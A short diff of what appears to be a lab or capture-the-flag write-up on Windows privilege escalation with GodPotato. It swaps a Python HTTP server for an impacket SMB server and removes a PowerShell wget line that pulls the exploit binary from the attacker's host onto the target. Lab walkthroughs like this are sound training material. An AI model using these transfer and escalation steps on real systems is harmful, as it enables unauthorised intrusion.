@@ -528,13 +528,13 @@ My potato of choice is GodPotato so ill upload that to the target
 https://github.com/BeichenDream/GodPotato
 
 ```python
-python3 -m http.server 8000                                                                                                              
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+impacket-smbserver share . -smb2support                                                  
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 Ill start a server on my system to host it
 
 ```python
-PS C:\Windows\system32> wget http://10.10.14.90:8000/GodPotato-NET4.exe
+
 ```
 This downloaded it
 
